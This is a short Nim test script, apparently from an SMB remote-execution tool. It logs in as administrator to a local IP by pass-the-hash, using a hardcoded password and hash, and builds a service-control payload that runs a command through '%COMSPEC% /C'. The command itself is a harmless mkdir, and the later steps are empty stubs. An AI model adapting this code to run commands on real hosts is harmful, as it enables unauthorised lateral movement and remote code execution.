#[
    SMB test
]#

#SMB1

import net, strutils, sequtils, HelpUtil, SMB
let hash = toNTLMHash("Aa123456")
var smb = newSMB2("192.168.1.22", ".", "administrator", hash) #"47bf8039a8506cd67c524a03ff84ba4e")
discard smb.connect()

let 
    SMBPath = r"\\" & smb.target & r"\IPC$"
    SMBPathBytes = SMBPath.unicodeGetBytes()
    named_pipe_UUID = @[0x81.byte,0xbb.byte,0x7a.byte,0x36.byte,0x44.byte,0x98.byte,0xf1.byte,0x35.byte,0xad.byte,0x32.byte,0x98.byte,0xf0.byte,0x38.byte,0x00.byte,0x10.byte,0x03.byte]
    SMBService = smb.serviceName

var SMBServiceBytes = SMBService.unicodeGetBytes()

if SMBServiceBytes.len mod 2 != 0:
    SMBServiceBytes = SMBServiceBytes.concat(@[0x00.byte, 0x00.byte])
else:
    SMBServiceBytes = SMBServiceBytes.concat(@[0x00.byte, 0x00.byte, 0x00.byte, 0x00.byte])

let SMBServiceLength = getBytes(SMBService.len + 1)

let 
    command = "mkdir c:\\itWorks.txt"
    full_command = "%COMSPEC% /C " & "\"" & command & "\""

var SMBExecCommand: seq[string]

for i in unicodeGetBytes(full_command):
    SMBExecCommand.add i.toHex()

if full_command.len mod 2 != 0:
    SMBExecCommand = SMBExecCommand.concat(@["00", "00"])
else:
    SMBExecCommand = SMBExecCommand.concat(@["00", "00", "00", "00"])

let 
    SMBExecCommandBytes = SMBExecCommand.join().hexToByteArray() 
    SMBExecCommandLengthBytes = getBytes((SMBExecCommand.len() / 2).int)
    SMBSplitIndex = 4256


#### TreeConnect

## CheckAccess


discard smb.close()